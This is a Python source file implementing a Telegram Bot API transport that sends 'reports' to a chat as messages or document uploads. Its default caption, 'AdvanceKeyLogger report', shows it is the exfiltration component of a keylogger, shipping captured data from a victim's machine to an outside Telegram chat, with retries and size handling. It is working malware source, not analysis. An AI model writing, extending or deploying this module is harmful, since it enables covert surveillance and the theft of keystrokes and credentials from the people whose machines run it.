"""
Telegram transport using Bot API.

Sends reports to a chat via sendMessage or sendDocument.
"""
from __future__ import annotations

import json
from typing import Any

import requests

from transport import register_transport
from transport.base import BaseTransport
from utils.resilience import retry

_MAX_FILE_SIZE = 50 * 1024 * 1024  # Telegram Bot API 50 MB limit


class _OversizedPayloadError(Exception):
    """Raised when payload exceeds Telegram's file-size limit (non-retryable)."""


@register_transport("telegram")
class TelegramTransport(BaseTransport):
    """Telegram Bot API transport."""

    def __init__(self, config: dict[str, Any]) -> None:
        super().__init__(config)
        self._bot_token = config.get("bot_token")
        self._chat_id = config.get("chat_id")
        self._timeout = float(config.get("timeout", 10))
        self._base_url = "https://api.telegram.org"
        self._session: requests.Session | None = None

    @property
    def _masked_token(self) -> str:
        if not self._bot_token:
            return "<not set>"
        return f"{self._bot_token[:5]}..."

    def _get_session(self) -> requests.Session:
        if self._session is None:
            self._session = requests.Session()
        return self._session

    def connect(self) -> None:
        if not self._bot_token or not self._chat_id:
            raise ValueError("Telegram transport requires bot_token and chat_id")
        session = self._get_session()
        try:
            response = session.get(
                f"{self._base_url}/bot{self._bot_token}/getMe",
                timeout=self._timeout,
            )
            if not response.ok or not response.json().get("ok"):
                raise ValueError(
                    f"Telegram bot token validation failed (token={self._masked_token})"
                )
        except (requests.RequestException, json.JSONDecodeError) as exc:
            raise ValueError(
                f"Telegram connection failed (token={self._masked_token}): {exc}"
            ) from exc
        self._connected = True

    @retry(
        max_attempts=3,
        backoff_base=2.0,
        exceptions=(requests.RequestException, OSError),
        retry_on_false=True,
    )
    def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
        if not self._connected:
            self.connect()
        meta = metadata or {}
        filename = meta.get("filename", "report.bin")
        caption = meta.get("caption", "AdvanceKeyLogger report")

        if len(data) > _MAX_FILE_SIZE:
            self.logger.error(
                "File size %d bytes exceeds Telegram 50 MB limit", len(data)
            )
            raise _OversizedPayloadError(
                f"Payload {len(data)} bytes exceeds {_MAX_FILE_SIZE} byte limit"
            )

        if len(data) < 3500 and meta.get("content_type") == "text/plain":
            return self._send_message(data.decode("utf-8", errors="replace"))
        return self._send_document(filename, data, caption)

    def disconnect(self) -> None:
        if self._session is not None:
            self._session.close()
            self._session = None
        self._connected = False

    def _send_message(self, text: str) -> bool:
        session = self._get_session()
        try:
            response = session.post(
                f"{self._base_url}/bot{self._bot_token}/sendMessage",
                data={"chat_id": self._chat_id, "text": text},
                timeout=self._timeout,
            )
            if not response.ok:
                self.logger.error(
                    "Telegram sendMessage HTTP error: %s", response.status_code
                )
                return False
            try:
                body = response.json()
            except json.JSONDecodeError:
                self.logger.error("Telegram sendMessage: invalid JSON response")
                return False
            if not body.get("ok"):
                self.logger.error(
                    "Telegram API error: %s", body.get("description")
                )
                return False
            return True
        except requests.RequestException as exc:
            self.logger.error("Telegram sendMessage failed: %s", exc)
            return False

    def _send_document(self, filename: str, data: bytes, caption: str) -> bool:
        session = self._get_session()
        try:
            response = session.post(
                f"{self._base_url}/bot{self._bot_token}/sendDocument",
                data={"chat_id": self._chat_id, "caption": caption},
                files={"document": (filename, data)},
                timeout=self._timeout,
            )
            if not response.ok:
                self.logger.error(
                    "Telegram sendDocument HTTP error: %s",
                    response.status_code,
                )
                return False
            try:
                body = response.json()
            except json.JSONDecodeError:
                self.logger.error("Telegram sendDocument: invalid JSON response")
                return False
            if not body.get("ok"):
                self.logger.error(
                    "Telegram API error: %s", body.get("description")
                )
                return False
            return True
        except requests.RequestException as exc:
            self.logger.error("Telegram sendDocument failed: %s", exc)
            return False
